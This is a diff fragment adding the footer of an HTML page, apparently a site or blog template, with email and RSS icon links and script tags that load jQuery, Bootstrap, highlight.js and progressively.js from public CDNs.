+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 16">
+            <path d="M0 4v8c0 .55.45 1 1 1h12c.55 0 1-.45 1-1V4c0-.55-.45-1-1-1H1c-.55 0-1 .45-1 1zm13 0L7 9 1 4h12zM1 5.5l4 3-4 3v-6zM2 12l3.5-3L7 10.5 8.5 9l3.5 3H2zm11-.5l-4-3 4-3v6z"/>
+        </svg>
+    </a>
+
+
+                    <a href=''
+    class="mx-1 ml-md-2 mr-md-0 icon"
+    aria-label="RSS">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/>
+    </svg>
+</a>
+
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js" integrity="sha256-1zu+3BnLYV9LdiY85uXMzii3bdrkelyp37e0ZyTAQh0=" crossorigin="anonymous"></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/bash.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/css.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/diff.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/django.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/python.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/yaml.min.js" defer></script>
+        
+        <script>
+            window.addEventListener('load', function() {
+                hljs.initHighlighting();
+            }, true);
+        </script>
+    
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.js" integrity="sha256-LvFVlLdfGI3WeEH+8Ni4kxLm02g2GlOfeGCGLXfRk/U=" crossorigin="anonymous"></script>
+        <script>
+            window.addEventListener('load', function() {
+                progressively.init({delay: 30, throttle: 50});
+            }, true);
+        </script>
+    
+
+    
+
+    
+    
+</body>
+
+</html>
